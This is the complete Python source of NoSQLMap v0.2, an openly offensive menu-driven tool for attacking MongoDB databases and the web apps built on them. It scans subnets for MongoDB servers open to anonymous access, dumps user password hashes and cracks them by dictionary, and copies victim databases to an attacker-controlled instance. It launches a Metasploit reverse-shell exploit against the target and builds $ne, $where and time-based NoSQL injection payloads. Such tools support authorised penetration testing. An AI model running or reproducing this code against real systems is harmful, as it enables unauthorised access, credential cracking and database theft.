#!/usr/bin/python
#NoSQLMap Copyright 2014 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.


import sys
import string
import random
import os
import time
import httplib2
import urllib
import pymongo
import subprocess
import json
import gridfs
import ipcalc
from hashlib import md5

#Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
global optionSet
optionSet = [False,False,False,False,False,False]
global victim
global webPort
global uri
global httpMethod
global myIP
global myPort


def mainMenu():
	select = True
	while select:
		os.system('clear')
		#label = subprocess.check_output(["git","describe","--always"])
		print "NoSQLMap-v0.2"
		print "nosqlmap@gmail.com"
		print "\n"
		print "1-Set options"
		print "2-NoSQL DB Access Attacks"
		print "3-NoSQL Web App attacks"
		print "4-Scan for Anonymous MongoDB Access"
		print "x-Exit"

		select = raw_input("Select an option: ")

		if select == "1":
			options()

		elif select == "2":
			if optionSet[0] == True:
				netAttacks(victim)
				
			#Check minimum required options
			else:
				raw_input("Target not set! Check options.  Press enter to continue...")
				mainMenu()
				
		
		elif select == "3":
			#Check minimum required options
			if (optionSet[0] == True) and (optionSet[2] == True):	
				webApps()
			
			else:
				raw_input("Options not set! Check Host and URI path.  Press enter to continue...")
				mainMenu()
				
		elif select == "4":
			massMongo()

		elif select == "x":
			sys.exit()
			
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			mainMenu()
			

def options():
	
	#Set default value if needed
	if optionSet[0] == False:
		global victim
		victim = "Not Set"
	if optionSet[1] == False:
		global webPort
		webPort = 80
		optionSet[1] = True
	if optionSet[2] == False:
		global uri
		uri = "Not Set"
	if optionSet[3] == False:
		global httpMethod
		httpMethod = "GET"
	if optionSet[4] == False:
		global myIP
		myIP = "Not Set"
	if optionSet[5] == False:
		global myPort
		myPort = "Not Set"
	
	select = True
	
	while select:	
		print "\n\n"
		print "Options"
		print "1-Set target host/IP (Current: " + str(victim) + ")"
		print "2-Set web app port (Current: " + str(webPort) + ")" 
		print "3-Set App Path (Current: " + str(uri) + ")"
		print "4-Set HTTP Request Method (GET/POST)"
		print "5-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
		print "6-Set shell listener port (Current: " + str(myPort) + ")"
		print "7-Load options file"
		print "8-Load options from saved Burp request"
		print "9-Save options file"
		print "x-Back to main menu"

		select = raw_input("Select an option: ")
		
		if select == "1":
			victim = raw_input("Enter the host IP/DNS name: ")
			print "\nTarget set to " + victim + "\n"
			optionSet[0] = True
			options()
			
		elif select == "2":
			webPort = raw_input("Enter the HTTP port for web apps: ")
			print "\nHTTP port set to " + webPort + "\n"
			optionSet[1] = True
			options()

		elif select == "3":
			uri = raw_input("Enter URI Path (Press enter for no URI): ")
			print "\nURI Path set to " + uri + "\n"
			optionSet[2] = True
			options()

		#NOT IMPLEMENTED YET FOR USE
		elif select == "4":
			httpMethod = True
			while httpMethod:

				print "1-Send request as a GET"
				print "2-Send request as a POST"
				httpMethod = raw_input("Select an option: ")
			
				if httpMethod == "1":
					print "GET request set"
					optionSet[3] = True
					options()

				elif httpMethod == "2":
					print "POST request set"
					optionSet[3] = True
					options()
				else:
					print "Invalid selection"

		elif select == "5":
			myIP = raw_input("Enter host IP for my Mongo/Shells: ")
			print "Shell IP set to " + myIP + "\n"
			optionSet[4] = True
			options()
		
		elif select == "6":
			myPort = raw_input("Enter TCP listener for shells: ")
			print "Shell TCP listener set to " + myPort + "\n"
			optionSet[5] = True
			options()
			
		elif select == "7":
			loadPath = raw_input("Enter file name to load: ")
			try:
				fo = open(loadPath,"r" )
				csvOpt = fo.read()
				fo.close()
				optList = csvOpt.split(",")
				victim = optList[0]
				webPort = optList[1]
				uri = optList[2]
				httpMethod = optList[3]
				myIP = optList[4]
				myPort = optList[5]
			
				#Set option checking array based on what was loaded
				x = 0
				for item in optList:
					if item != "Not Set":
						optionSet[x] = True
					x += 1
			except:
				print "Couldn't load options file!"
			options()
		
		elif select == "8":
			loadPath = raw_input("Enter path to Burp request file: ")

			try:
				fo = open(loadPath,"r")
				reqData = fo.readlines()
				
			except:
				raw_input("error reading file.  Press enter to continue...")
				mainMenu()

			methodPath = reqData[0].split(" ")

			if methodPath[0] == "GET":
				httpMethod = "GET"
			
			elif methodPath[0] == "POST":
				httpMethod = "POST"
				postData = reqData[len(reqData)-1]
			else:
				print "unsupported method in request header."
			
			victim = reqData[1].split( " ")[1].replace("\r\n","")
			optionSet[0] = True
			uri = methodPath[1].replace("\r\n","")
			optionSet[2] = True			
			
		elif select == "9":
			savePath = raw_input("Enter file name to save: ")
			try:
				fo = open(savePath, "wb")
				fo.write(str(victim) + "," + str(webPort) + "," + str(uri) + "," + str(httpMethod) + "," + str(myIP) + "," + str(myPort)) 
				fo.close()
				print "Options file saved!"
			except:
				print "Couldn't save options file."

		elif select == "x":
			mainMenu()
			
def netAttacks(target):
	print "DB Access attacks"
	print "================="
	mgtOpen = False
	webOpen = False
	#This is a global for future use with other modules; may change
	global dbList
	
	srvNeedCreds = raw_input("Does the database server need credentials? ")
	
	if srvNeedCreds == "n" or srvNeedCreds == "N":
		
		try:
			conn = pymongo.MongoClient(target,27017)
			print "MongoDB port open on " + target + ":27017!"
			mgtOpen = True
	
		except:
			print "MongoDB port closed."					
	
	elif srvNeedCreds == "y" or srvNeedCreds == "Y":
		srvUser = raw_input("Enter server username: ")
		srvPass = raw_input("Enter server password: ")
		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + victim +"/"

		try:
			conn = pymongo.MongoClient(uri)
			print "MongoDB authenticated on " + target + ":27017!"
			mgtOpen = True
		except:
			raw_input("Failed to authenticate.  Press enter to continue...")
			mainMenu()
	
	
	mgtUrl = "http://" + target + ":28017"	
	#Future rev:  Add web management interface parsing
	
	try:
		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
		if mgtRespCode == 200:
			print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
			testRest = raw_input("Start tests for REST Interface? ")

		if testRest == "y" or testRest == "Y":
			restUrl = mgtUrl + "/listDatabases?text=1"
			restResp = urllib.urlopen(restUrl).read()
			restOn = restResp.find('REST is not enabled.')

			if restOn == -1:
				print "REST interface enabled!"
				dbs = json.loads(restResp)
				menuItem = 1
				print "List of databases from REST API:"

				for x in range(0,len(dbs['databases'])):
					dbTemp= dbs['databases'][x]['name']
					print str(menuItem) + "-" + dbTemp
					menuItem += 1
			print "\n"

		else:
			print "REST interface not enabled." 
			
	except:
		
		print "MongoDB web management closed or requires authentication."	
		
	print "\n"
	if mgtOpen == True:
		print "Server Info:"
		mongoVer = conn.server_info()['version']
		print "MongoDB Version: " + mongoVer
		mongoDebug = conn.server_info()['debug']
		print "Debugs enabled : " + str(mongoDebug)
		mongoPlatform = conn.server_info()['bits']
		print "Platform: " + str(mongoPlatform) + " bit"
		print "\n"
		
		try:
			print "List of databases:"
			dbList = conn.database_names()
			print "\n".join(dbList)
			print "\n"
			
		except:
			print "Error:  Couldn't list databases.  The provided credentials may not have rights."
		
		print "List of collections:"
		#print "\n"
		
		try:
			for dbItem in dbList:
				db = conn[dbItem]
				colls = db.collection_names()
				print dbItem + ":"
				print "\n".join(colls)
				print "\n"
				
				if 'system.users' in colls:
					users = list(db.system.users.find())
					print "Database Users and Password Hashes:"
					
					for x in range (0,len(users)):
						print "Username: " + users[x]['user']
						print "Hash: " + users[x]['pwd']
						print "\n"
						crack = raw_input("Crack this hash? ")
						
						if crack == "y":
							brute_pass(users[x]['user'],users[x]['pwd'])
					
		except:
			print "Error:  Couldn't list collections.  The provided credentials may not have rights."
		
		print "\n"
		#Start GridFS enumeration
		
		testGrid = raw_input("Check for GridFS? ")
		
		if testGrid == "y" or testGrid == "Y":
			for dbItem in dbList:
				try:
					db = conn[dbItem]
					fs = gridfs.GridFS(db)
					files = fs.list()
					print "GridFS enabled on database " + str(dbItem)
					print " list of files:"
					print "\n".join(files)
					
				except:
					print "GridFS not enabled on " + str(dbItem) + "."
							
		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
		
		if stealDB == "y" or stealDB == "Y":
			stealDBs (myIP)
			
		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)? ")
		
		if getShell == "y" or getShell == "Y":
			#Launch Metasploit exploit
			try:
				proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
			
			except:
				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."	
	raw_input("Press enter to continue...")
	return()
		
	
	
def webApps():
	print "Web App Attacks"
	print "==============="
	paramName = []
	paramValue = []
	vulnAddrs = []
	possAddrs = []
	timeVulnsStr = []
	timeVulnsInt = []
	appUp = False
	strTbAttack = False
	intTbAttack = False
	
	#Verify app is working.  
	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
	
	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
	
	try:
		appRespCode = urllib.urlopen(appURL).getcode()
		if appRespCode == 200:
			normLength = int(len(urllib.urlopen(appURL).read()))
			timeReq = urllib.urlopen(appURL)
			start = time.time()
			page = timeReq.read()
			end = time.time()
			timeReq.close()
			timeBase = round((end - start), 3)
			
			
			
			print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
			appUp = True
		
		else:
			print "Got " + appRespCode + "from the app, check your options."
	except:
		print "Looks like the server didn't respond.  Check your options."
	
	if appUp == True:
			
		injectSize = raw_input("Baseline test-Enter random string size: ")
		injectString = randInjString(int(injectSize))
		print "Using " + injectString + " for injection testing.\n"
		
		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
		randomUri = buildUri(appURL,injectString)
		print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
		randLength = int(len(urllib.urlopen(randomUri).read()))
		print "Got response length of " + str(randLength) + "."
		
		randNormDelta = abs(normLength - randLength)
		
		if randNormDelta == 0: 
			print "No change in response size injecting a random parameter..\n"
		else:
			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter value!\n"
			
		print "Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"..."
		injLen = int(len(urllib.urlopen(uriArray[1]).read()))
		print "Got response length of " + str(injLen) + "."
		
		randInjDelta = abs(injLen - randLength)
		
		if (randInjDelta >= 100) and (injLen != 0) :
			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
			vulnAddrs.append(uriArray[1])
		
		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
			possAddrs.append(uriArray[1])
		
		elif (randInjDelta == 0):
			print "Random string response size and not equals injection were the same. Injection did not work."
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[1])
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
		print "Injecting " + uriArray[2]
		
		whereStrLen = int(len(urllib.urlopen(uriArray[2]).read()))
		whereStrDelta = abs(whereStrLen - randLength)
		
		if (whereStrDelta >= 100) and (whereStrLen > 0):
			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
			vulnAddrs.append(uriArray[2])
		
		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[2])
			
		elif (whereStrDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[2])
		
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
		print "Injecting " + uriArray[3]
		
		whereIntLen = int(len(urllib.urlopen(uriArray[3]).read()))
		whereIntDelta = abs(whereIntLen - randLength)
		
		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(uriArray[3])
			
		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[3])
			
		elif (whereIntDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[3])
			
		#Start a single record attack in case the app expects only one record back
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
		print " Injecting " + uriArray[4]
		
		
		whereOneStrLen = int(len(urllib.urlopen(uriArray[4]).read()))
		whereOneStrDelta = abs(whereOneStrLen - randLength)
			
		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
			vulnAddrs.append(uriArray[4])
		
		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[4])
			
		elif (whereOneStrDelta == 0):
			print "Random string response size and $where single injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[4])
			
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
		print " Injecting " + uriArray[5]
		
		
		whereOneIntLen = int(len(urllib.urlopen(uriArray[5]).read()))
		whereOneIntDelta = abs(whereOneIntLen - randLength)				
			
		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(uriArray[5])
		
		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[5])
			
		elif (whereOneIntDelta == 0):
			print "Random string response size and $where single record injection were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(uriArray[5])
			
		print "\n"
		print "Testing Mongo this not equals string escape attack for all records..."
		print " Injecting " + uriArray[8]
		
		whereThisStrLen = int(len(urllib.urlopen(uriArray[8]).read()))
		whereThisStrDelta = abs(whereThisStrLen - randLength)
		
		if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(uriArray[8])
		
		elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
			print " response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[8])
			
		elif (whereThisStrDelta == 0):
			print "Random string response size and this return response size were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(uriArray[8])
			
		print "\n"
		print "Testing Mongo this not equals integer escape attack for all records..."
		print " Injecting " + uriArray[9]
		
		whereThisIntLen = int(len(urllib.urlopen(uriArray[9]).read()))
		whereThisIntDelta = abs(whereThisIntLen - randLength)
		
		if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(uriArray[9])
		
		elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
			print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[9])
			
		elif (whereThisIntDelta == 0):
			print "Random string response size and this return response size were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(uriArray[9])
			
		print "\n"
		doTimeAttack = raw_input("Start timing based tests? ")
		
		if doTimeAttack == "y" or doTimeAttack == "Y":
			print "Starting Javascript string escape time based injection..."
			start = time.time()
			strTimeInj = urllib.urlopen(uriArray[6])
			page = strTimeInj.read()
			end = time.time()
			strTimeInj.close()
			#print str(end)
			#print str(start)
			strTimeDelta = (int(round((end - start), 3)) - timeBase)
			#print str(strTimeDelta)
			if strTimeDelta > 25:
				print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
				strTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(strTimeDelta) + ".  Injection probably didn't work."
				strTbAttack = False
			
			print "Starting Javascript integer escape time based injection..."
			start = time.time()
			intTimeInj = urllib.urlopen(uriArray[7])
			page = intTimeInj.read()
			end = time.time()
			intTimeInj.close()
			#print str(end)
			#print str(start)
			intTimeDelta = (int(round((end - start), 3)) - timeBase)
			#print str(strTimeDelta)
			if intTimeDelta > 25:
				print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
				intTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(intTimeDelta) + "seconds.  Injection probably didn't work."
				intTbAttack = False
		
		print "\n"	
		print "Vunerable URLs:"
		print "\n".join(vulnAddrs)
		print "\n"
		print "Possibly vulnerable URLs:"
		print"\n".join(possAddrs)
		print "\n"
		print "Timing based attacks:"
		
		if strTbAttack == True:
			print "String attack-Successful"
		else:
			print "String attack-Unsuccessful"
		if intTbAttack == True:
			print "Integer attack-Successful"
		else:
			print "Integer attack-Unsuccessful"
		
		fileOut = raw_input("Save results to file?")
		
		if fileOut == "y" or fileOut == "Y":
			savePath = raw_input("Enter output file name: ")
			fo = open(savePath, "wb")
			fo.write ("Vulnerable URLs:\n")
			fo.write("\n".join(vulnAddrs))
			fo.write("\n\n")
			fo.write("Possibly Vulnerable URLs:\n")
			fo.write("\n".join(possAddrs))
			fo.write("\n")
			fo.write("Timing based attacks:\n")
			
			if strTbAttack == True:
				fo.write("String Attack-Successful\n")
			else:
				fo.write("String Attack-Unsuccessful\n")
			fo.write("\n")
			
			if intTbAttack == True:
				fo.write("Integer attack-Successful\n")
			else:
				fo.write("Integer attack-Unsuccessful\n")
			fo.write("\n")
			fo.close()
		
	raw_input("Press enter to continue...")
	return()

def randInjString(size):
	print "What format should the random string take?"
	print "1-Alphanumeric"
	print "2-Letters only"
	print "3-Numbers only"
	print "4-Email address"
	format = True
	
	while format:
		format = raw_input("Select an option: ")
	
		if format == "1":
			chars = string.ascii_letters + string.digits
			return ''.join(random.choice(chars) for x in range(size))
	
		elif format == "2":
			chars = string.ascii_letters
			return ''.join(random.choice(chars) for x in range(size))
	
		elif format == "3":
			chars = string.digits
			return ''.join(random.choice(chars) for x in range(size))
	
		elif format == "4":
			chars = string.ascii_letters + string.digits
			return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'
		
		else:
			format = True
			print "Invalid selection."
	

def buildUri(origUri, randValue):
	paramName = []
	paramValue = []
	global uriArray
	uriArray = ["","","","","","","","","","","","","",""]
	injOpt = ""
	
	#Split the string between the path and parameters, and then split each parameter
	try:
		split_uri = origUri.split("?")
		params = split_uri[1].split("&")
	
	except:
		raw_input("Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu...")
		mainMenu()
		
	for item in params:
		index = item.find("=")
		paramName.append(item[0:index])
		paramValue.append(item[index + 1:len(item)])
		
	menuItem = 1
	print "List of parameters:"
	for params in paramName:
		print str(menuItem) + "-" + params
		menuItem += 1
		
	
	
	try:
		injIndex = raw_input("Which parameter should we inject? ")
		injOpt = str(paramName[int(injIndex)-1])
		print "Injecting the " + injOpt + " parameter..."
	except:
		raw_input("Something went wrong.  Press enter to return to the main menu...")
		mainMenu()
	
	#print "debug:"
	#print split_uri[0]
	
	x = 0
	uriArray[0] = split_uri[0] + "?"
	uriArray[1] = split_uri[0] + "?"
	uriArray[2] = split_uri[0] + "?"
	uriArray[3] = split_uri[0] + "?"
	uriArray[4] = split_uri[0] + "?"
	uriArray[5] = split_uri[0] + "?"
	uriArray[6] = split_uri[0] + "?"
	uriArray[7] = split_uri[0] + "?"
	uriArray[8] = split_uri[0] + "?"
	uriArray[9] = split_uri[0] + "?"
	uriArray[10] = split_uri[0] + "?"
	uriArray[11] = split_uri[0] + "?"
	uriArray[12] = split_uri[0] + "?"
	uriArray[13] = split_uri[0] + "?"
	
	for item in paramName:		
		if paramName[x] == injOpt:
			uriArray[0] += paramName[x] + "=" + randValue + "&"
			uriArray[1] += paramName[x] + "[$ne]=" + randValue + "&"
			uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
			uriArray[3] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
			uriArray[4] += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
			uriArray[5] += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
			uriArray[6] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
			uriArray[7] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
			uriArray[8] += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
			uriArray[9] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
			uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy=\"!" + "&"
			uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy=\"!" + "&"
			uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
			uriArray[13] += paramName[x] + "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
			

		else:
			uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[1] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[2] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[3] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[4] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[5] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[6] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[7] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[8] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[9] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[10] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[11] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[12] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[13] += paramName[x] + "=" + paramValue[x] + "&"
			
		x += 1
		
	#Clip the extra & off the end of the URL
	uriArray[0]= uriArray[0][:-1]
	uriArray[1] = uriArray[1][:-1]
	uriArray[2] = uriArray[2][:-1]
	uriArray[3] = uriArray[3][:-1]
	uriArray[4] = uriArray[4][:-1]
	uriArray[5] = uriArray[5][:-1]
	uriArray[6] = uriArray[6][:-1]
	uriArray[7] = uriArray[7][:-1]
	uriArray[8] = uriArray[8][:-1]
	uriArray[9] = uriArray[9][:-1]
	uriArray[10] = uriArray[10][:-1]
	uriArray[11] = uriArray[11][:-1]
	uriArray[12] = uriArray[12][:-1]
	uriArray[13] = uriArray[13][:-1]
	return uriArray[0]

def stealDBs(myDB):
	menuItem = 1
	if optionSet[4] == False:
		raw_input("No destination database set! Press enter to return to the main menu.")
		mainMenu()
	
	for dbName in dbList:
		print str(menuItem) + "-" + dbName
		menuItem += 1
	
	try:
		dbLoot = raw_input("Select a database to steal:")
	
	except:
		print "Invalid selection."
		stealDBs(myDB)
		
	try:
		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
		dbNeedCreds = raw_input("Does this database require credentials? ")
		
		if dbNeedCreds == "n" or dbNeedCreds == "N":	
			myDBConn = pymongo.MongoClient(myDB,27017)
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
		
		elif dbNeedCreds == "y" or dbNeedCreds == "Y":
			dbUser = raw_input("Enter database username: ")
			dbPass = raw_input("Enter database password: ")
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)
		
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			stealDBs(myDB)
			
		cloneAnother = raw_input("Database cloned.  Copy another? ")
		
		if cloneAnother == "y" or cloneAnother == "Y":
			stealDBs(myDB)
		
		else:
			return()
	
	except:
		if str(sys.exc_info()).find('text search not enabled') != -1:
			raw_input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
			mainMenu()
		else:
			raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
			mainMenu()
	
def massMongo():
	global victim
	optCheck = True
	loadCheck = False
	success = []
	ipList = []
	print "\n"
	print "MongoDB Default Access Scanner"
	print "=============================="
	print "1-Scan a subnet for default MongoDB access"
	print "2-Loads IPs to scan from a file"
	
	while optCheck:
		loadOpt = raw_input("Select a scan method: ")
		
	
		if loadOpt == "1":
			subnet = raw_input("Enter subnet to scan: ")
		
			try:
				for ip in ipcalc.Network(subnet):
					ipList.append(str(ip))
				optCheck = False
			except:
				raw_input("Not a valid subnet.  Press enter to return to main menu.")
				mainMenu()
				
	
		#print "Debug:"
		#print ipList
	
		if loadOpt == "2":
			while loadCheck == False:
				loadPath = raw_input("Enter file name with IP list to scan: ")

				try:
					with open (loadPath) as f:
					        ipList = f.readlines()
					loadCheck = True
					optCheck = False
				except:
					print "Couldn't open file."
			

	print "\n"
	for target in ipList:
	        try:
	                conn = pymongo.MongoClient(target,27017)
			print "Connected to " + target
			dbList = conn.database_names()
			
			print "Successful default access on " + target
			target = target[:-1]
			success.append(target)
			conn.disconnect()

		except:
		        print "Failed to connect to or need credentials for " + target 

	print "\n\n"
	print "Discovered MongoDB Servers:"
	
	menuItem = 1
	for server in success:
		print str(menuItem) + "-" + server
		menuItem += 1
	
	select = True
	print "\n"
	while select:
		select = raw_input("Select a NoSQLMap target or press x to exit: ")
	
		if select == "x" or select == "X":
			mainMenu()
	
		elif select.isdigit() == True:
			victim = success[int(select) - 1]
			optionSet[0] = True
			raw_input("New target set! Press enter to return to the main menu.")
			mainMenu()
	
		else:
			raw_input("Invalid selection.")				
	
def gen_pass(user, passw):
	return md5(user + ":mongo:" + str(passw)).hexdigest();


def brute_pass(user,key):
	loadCheck = False
	
	while loadCheck == False:
		dictionary = raw_input("Enter path to password dictionary: ")
		try:
			with open (dictionary) as f:
			       passList = f.readlines()
			loadCheck = True
		except:
			print " Couldn't load file."
	
	
	print "Running dictionary attack..."
	for passGuess in passList:
		temp = passGuess.split("\n")[0]
		
		if gen_pass(user, temp) == key:
			print "\nFound - "+user+":"+passGuess
			return passGuess
			
	print "Password not found for "+user
	return ""

mainMenu()
